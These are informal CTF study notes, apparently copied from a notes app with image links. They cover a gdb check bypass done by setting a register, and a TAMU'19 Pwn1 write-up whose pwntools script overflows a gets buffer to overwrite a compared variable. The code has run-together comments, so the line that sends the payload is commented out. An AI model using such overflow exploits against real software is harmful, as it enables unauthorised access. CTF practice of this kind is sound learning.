-- disassemble main function ```disassemble main```
- to beautify ```set disassembly-flavor intel```
-  ![[Pasted image 20240427100211.png]]
- focus on function calls and create a rough control flow 
- ![[Pasted image 20240427102347.png]]
- using ni track the address and output
- set break point at the last compare at 607
- since  607 is checking for 0 at eax,we manually change this to 0 by ```set $eax=0```
- run ... we got access granted


#### TAMU'19: Pwn1

![[Pasted image 20240430175919.png]]
![[Pasted image 20240430180018.png]]

- here we could see that our input must contain the two strings to pass the both strcmp checks
- after these strcmp we coluld see that "deall0c8" is compared
-![[Pasted image 20240430180156.png]]
- next step to padd and overwrite to the local18 which is being comared so we find offset and padd with  any value and after padding we concatenate the the value to be overwritten deall0c8
- so now print flag is called
- now our finall program will be 
```
# Import pwntools 
from pwn import *
# Establish the target process 
target = process('./pwn1') 
# Make the payload 
payload = "" 
payload += "0"*0x2b # Padding to `local_18` 
payload += p32(0xdea110c8) 
# the value we will overwrite local_18 with, in little endian # Send the strings to reach the gets call 
target.sendline("Sir Lancelot of Camelot") 
target.sendline("To seek the Holy Grail.") # Send the payload target.sendline(payload) 
target.interactive()
```